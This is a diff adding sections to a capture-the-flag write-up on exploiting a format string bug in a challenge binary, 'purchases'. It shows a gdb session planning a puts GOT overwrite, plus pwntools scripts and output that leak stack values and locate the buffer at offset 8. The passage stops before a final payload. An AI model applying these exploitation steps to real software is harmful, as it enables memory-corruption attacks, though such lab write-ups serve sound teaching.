@@ -2,6 +2,7 @@
 >This grumpy shop owner won't sell me his flag! At least I have his source.
 
 ##### *tl;dr: format string vulnerability to overwrite printf GOT*
+### Source Code Analysis
 #### As with the other pwn challenges, the source codes are given - making the vulnerability finding process much easier:
 ```c
 #include <stdlib.h>
@@ -50,6 +51,7 @@ int main() {
 
 > [Adapting the 32bit exploit to 64bit for format4 - bin 0x27](https://www.youtube.com/watch?v=_lO_rwaK_pY&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=42)
 
+### Brainstorming
 #### Examining the source code again, we see that there is is a flag function which prints out the flag for us. Taking a note of this, our exploit plan will be to take advantage of the format string vulnerability to overwrite puts' `GOT address` to the flag function - thus making puts execute what flag does. To test if our plan would work, we try it out in gdb. We set a breakpoint before the puts call, then change the it's GOT address to the address of flag:
 ```
 $ gdb ./purchases
@@ -93,3 +95,36 @@ $ gdb ./purchases
 	Cannot access memory at address 0x401326
 ```
 #### To talk you through what just happened, first we disassembled the puts function and saw that the first thing it does is to jump to it's GOT entry address, `0x404018`. Now that we have the GOT address for puts, we printed out the address for flag, set a breakpoint before our puts call. After we hit the breakpoint, we set the contents of the GOT address to flag's address, then we validate if we have successfully overwriten the value. Continuing the process, the binary executes /bin/dash and proceeds to call the flag function.
+
+### Exploitation
+#### Since we have confirmed that our plan works theoretically, it's time to craft the exploit. For this to work, we need to find out which offset we can find our buffer. We can automate this using a short script:
+```python
+from pwn import *
+
+#: Connect to challenge server
+p = process('./purchases')
+print(p.recv())
+
+#: Exploit code
+exploit = 'AAAABBBB' + ' %p ' * 10
+
+#: Send payload
+p.sendline(exploit)
+print(p.recv())
+```
+#### Running the script, we get this result:
+```
+What item would you like to purchase? 
+You don't have any money to buy AAAABBBB 0x7ffd0237f380  0x7f5f5d2d08c0  (nil)  0x20  0x7f5f5d4d74c0  0xb  0x3e85d2d6660  0x4242424241414141  0x2070252020702520  0x2070252020702520 s. You're wasting your time! We don't even sell AAAABBBB 0x7ffd0237f380  0x7f5f5d2d08c0  (nil)  0x30  (nil)  0xb  0x3e85d2d6660  0x4242424241414141  0x2070252020702520  0x2070252020702520 s. Leave this place and buy AAAABBBB 0x7ffd0237f380  0x7f5f5d2d08c0  (nil)  0x1c  (nil)  0xb  0x3e85d2d6660  0x4242424241414141  0x2070252020702520  0x2070252020702520  somewhere else. Get out!
+```
+#### The input we provided has hex values of 0x41 and 0x42, and searching them in the output, we see that our buffer can be found at offset 8. Modifying the script we used earlier, we can verify this by only printing out the 8th offset from the leak. 
+```python
+#: Exploit code
+exploit = 'AAAABBBB' + ' %8$p'
+```
+#### Which results to:
+```
+You don't have any money to buy AAAABBBB 0x4242424241414141s. You're wasting your time! We don't even sell AAAABBBB 0x4242424241414141s. Leave this place and buy AAAABBBB 0x4242424241414141 somewhere else. Get out!
+```
+
+
